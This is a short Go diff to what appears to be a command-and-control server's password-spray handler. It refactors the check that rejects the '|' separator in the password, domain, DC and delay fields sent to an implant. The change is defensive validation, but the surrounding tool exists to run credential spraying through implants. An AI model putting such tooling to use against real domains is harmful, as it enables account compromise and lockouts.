@@ -74,11 +74,9 @@ func (s *Server) handlePasswordSpray(c *gin.Context) {
 	// "pa|ss" makes the implant read the domain as "ss" and spray the WRONG
 	// domain, which can lock out accounts in it. Refuse instead of building a
 	// task that silently means something else.
-	for name, value := range map[string]string{"password": password, "domain": domain, "dc": dc, "delay_ms": delayMs} {
-		if strings.ContainsRune(value, '|') {
-			respondError(c, http.StatusBadRequest, name+" must not contain '|'")
-			return
-		}
+	if credentialCommandHasSeparator(password, domain, dc, delayMs) {
+		respondError(c, http.StatusBadRequest, "password, domain, dc and delay_ms must not contain the '|' separator")
+		return
 	}
 
 	if _, ok := s.getAgentOrFail(c, id); !ok {
